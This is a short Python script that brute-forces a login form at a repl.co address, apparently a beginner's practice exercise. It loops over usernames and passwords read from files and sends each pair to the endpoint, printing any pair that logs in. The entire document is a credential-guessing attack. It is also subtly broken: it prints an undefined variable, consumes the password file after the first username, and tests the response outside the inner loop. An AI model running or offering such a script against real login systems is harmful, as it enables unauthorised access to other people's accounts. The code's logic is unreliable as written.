import requests


url = "https://requestswebsite.notanothercoder.repl.co/confirm-login"
username = 'admin'

def send_request(username, password):
    data = {
        "username" : username,
        "password" : password
    }

    r = requests.get(url, data=data)
    return r


ufile = open('usernames.txt', 'r')
pfile = open('passwords.txt', 'r')


for username in ufile:
    for passwd in pfile:
        r = send_request(username, passwd)

    if 'failed to login' in r.text.lower():
        print(f'tried {username}, {password} \n')
    else:
        print(f"Login found: {username}, {password}!\n")
        break

